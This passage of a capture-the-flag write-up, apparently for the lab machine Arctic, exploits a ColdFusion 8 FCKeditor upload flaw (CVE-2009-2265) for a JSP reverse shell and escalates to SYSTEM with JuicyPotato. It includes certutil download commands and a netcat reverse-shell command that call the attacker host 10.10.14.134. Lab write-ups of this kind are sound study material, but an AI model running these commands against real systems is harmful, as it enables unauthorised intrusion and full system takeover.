
## Exploitation

### CVE-2009-2265 — Unrestricted File Upload (FCKeditor)

A quick search for ColdFusion 8 vulnerabilities surfaces **CVE-2009-2265** immediately. The FCKeditor file manager component bundled with ColdFusion 8 exposes an upload endpoint that requires **no authentication**. More critically, it is vulnerable to a **null byte injection** in the `CurrentFolder` parameter, which allows an attacker to bypass extension filters and drop arbitrary files — including executable JSP webshells — directly onto the server.

The upload endpoint is:

```
/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm
```

The exploit ([EDB-50057](https://www.exploit-db.com/exploits/50057)) automates the full chain:

1. Generates a JSP reverse shell with `msfvenom`
2. Uploads it via a crafted `multipart/form-data` request, using `CurrentFolder=/<uuid>.jsp%00` to force the server to save the file with a `.jsp` extension
3. Triggers the shell by requesting the uploaded file
4. Catches the connection with a netcat listener

Update the `lhost`, `lport`, `rhost`, `rport` variables in the script before running.

![Script variables](/assets/img/posts/artic/image-1.png)

```bash
python3 50057.py

Generating a payload...
Payload size: 1498 bytes
Saved as: abbcd76dc3c046b592e4fe314435ef52.jsp

Priting request...
Content-type: multipart/form-data; boundary=8fbfb331796c471fa98c8abe4f56ff4e
Content-length: 1699

[...]

Deleting the payload...
Listening for connection...
```


## Privilege Escalation

### SeImpersonatePrivilege — JuicyPotato

Checking current privileges:

```
C:\Users>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

`SeImpersonatePrivilege` is enabled. This is the classic footprint of a Windows service account (IIS, ColdFusion, SQL Server...) and opens the door to the **Potato** family of privilege escalation techniques.

The privilege allows a process to impersonate another user's security token. JuicyPotato abuses this by spinning up a fake COM server, tricking a high-privileged DCOM service (in this case **BITS**, running as SYSTEM) into connecting to it, then stealing its token via `ImpersonateNamedPipeClient()`. Once in possession of a SYSTEM token, it calls `CreateProcessWithTokenW()` to spawn an arbitrary process — in our case, a reverse shell.

This technique works reliably on **Windows Server 2008 R2**, which is exactly what Arctic runs.

Transfer the tools to the target:

```
certutil -urlcache -split -f http://10.10.14.134:8000/JuicyPotato.exe C:\Windows\Temp\jp2.exe
certutil -urlcache -split -f http://10.10.14.134:8000/nc.exe C:\Windows\Temp\nc.exe
```

Start a listener on the attacking machine:

```bash
nc -lvnp 9999
```

Launch JuicyPotato using the **BITS CLSID** for Server 2008 R2:

```
C:\Windows\Temp\jp2.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c C:\Windows\Temp\nc.exe 10.10.14.134 9999 -e cmd.exe" -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}

Testing {9B1F122C-2982-4e91-AA8B-E071D54F2A4D} 1337
....
[+] authresult 0
{9B1F122C-2982-4e91-AA8B-E071D54F2A4D};NT AUTHORITY\SYSTEM
[+] CreateProcessWithTokenW OK
```

On the listener:

```
nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.10.14.134] from (UNKNOWN) [10.129.63.160] 49384
Microsoft Windows [Version 6.1.7600]
```
